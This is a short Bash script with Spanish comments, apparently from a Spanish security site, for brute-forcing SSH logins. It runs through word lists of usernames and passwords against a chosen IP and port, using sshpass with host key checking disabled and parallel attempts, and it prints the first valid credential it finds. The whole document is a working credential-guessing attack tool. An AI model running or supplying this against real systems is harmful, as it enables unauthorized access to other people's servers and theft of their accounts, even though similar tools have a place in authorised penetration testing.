#!/bin/bash
#
# Fuerza bruta inversa SSH
#
# apt-get install sshpass
#
# Uso: ./brutessh7.sh [IP] [Puerto]
#
# hackingyseguridad.com 2025
#

IP=${1:-127.0.0.1}
PORT=${2:-22}
MAX_THREADS=2
THREAD_COUNT=0

test_ssh() {
    local user=$1
    local pass=$2
    if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
       -o ConnectTimeout=5 -p $PORT $user@$IP exit 2>/dev/null; then
        echo -e "\n[+] Credencial valida: $user@$IP - Clave: $pass"
        killall sshpass 2>/dev/null
        exit 0
    fi
}
while read password; do
    while read user; do
        ((THREAD_COUNT++))
        test_ssh "$user" "$password" &
        # Control de hilos
        if (( THREAD_COUNT % MAX_THREADS == 0 )); then
            wait
        fi
    done < <(tr -d '\r' < usuarios0.txt)
done < <(tr -d '\r' < claves0.txt)
wait
echo -e "\n[!] .."
